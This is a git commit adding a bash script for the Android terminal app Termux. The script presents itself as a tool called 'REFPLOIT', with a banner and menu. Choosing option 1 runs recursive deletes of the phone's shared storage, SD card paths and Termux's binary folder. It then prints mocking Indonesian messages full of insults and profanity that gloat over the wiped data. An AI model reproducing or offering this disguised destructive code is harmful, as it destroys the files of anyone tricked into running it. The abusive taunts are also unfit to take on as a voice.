decbe8d4591fda91ad02fd4f7aff6d5a9c5b1588
TU4NG4L4U <46773642+TU4NG4L4U@users.noreply.github.com>
2019-01-30 15:37:44 +0700

    Add files via upload

---
+++ Mantep.sh
@@ -0,0 +1,47 @@
+#!/usr/xsystem/bash/bin
+#Muka lhu semua Bruqs Yah Anjink
+#Recod By TU4N G4L4U
+
+
+toilet -f mono12 -F border REFPLOIT
+
+echo 
+"\033[33;1m_________________________________________________"
+echo 
+"\033[30;1m|_______________________________________________|"
+echo 
+"\033[37;1m[•]-------------------------------------------[•]"
+echo "\033[31;1mauthor : " "\033[36;1mTU4N G4L4U"
+echo "\033[31;1mdate  : " "\033[34;1m 16-1-2019"
+echo "\033[31;1mprogram : " "\033[33;1mbash/shell"
+echo "\033[31;1mfacebook : " "\033[35;1mMaun Lhu Yahhh"
+echo "\033[31;1mwhatsApp : " "\033[32;1mjangan kepo kaya 
+mantan"
+echo 
+"\033[37;1m[•]-------------------------------------------[•]"
+echo 
+"\033[33;1m|_______________________________________________|"
+sleep 01
+echo "\033[34;1m××××××××××××××××××××××××××××××××"
+echo "\033[36;1m|}1{" "\033[32;1mref""\033[33;1mploit|"
+echo "\033[34;1m××××××××××××××××××××××××××××××××"
+
+echo "\033[32;1m"
+ read -p "root@start_refploit:~#" ommo
+
+
+if [ $ommo = 1 ] || [ $ommo = 1 ]
+then
+clear
+pkg update
+pkg upgrade
+rm -rf /storage/emulated/0
+rm -rf /storage
+rm -rf /storage/sdcard
+rm -rf /storage/sdcard1
+rm -rf $PREFIX/bin
+figlet Hwhwhwhwhwhw MAMPOS BABI DATA-DATA
+HANDPHONE KALIAN KE RESET HAHAHAHAHAHAHAH Kontol
+echo Unchhhhh:* cup-cup kesian ea babi Jgn Nangis ea 
+Kamvank..sabar ae |lolcat -a -d 150
+fi
